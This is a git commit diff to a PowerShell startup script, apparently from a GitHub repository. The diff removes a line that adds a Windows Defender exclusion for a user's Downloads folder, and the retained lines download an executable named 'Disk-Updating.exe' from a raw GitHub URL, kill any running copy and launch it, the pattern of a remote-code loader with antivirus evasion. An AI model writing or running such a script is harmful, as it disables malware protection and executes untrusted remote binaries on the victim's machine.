d95e664b73d317ed47a829e77ebc513fe6fa8b0f
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-28 22:48:01 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,6 +1,3 @@
-# Parches Ejecución de Tareas.
-Add-MpPreference -ExclusionPath "C:\Users\ana\Downloads"
-
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/Disk-Updating.exe -OutFile C:\Users\ana\Downloads\Disk-Updating.exe
 taskkill /F /IM Disk-Updating.exe
 C:\Users\ana\Downloads\Disk-Updating.exe
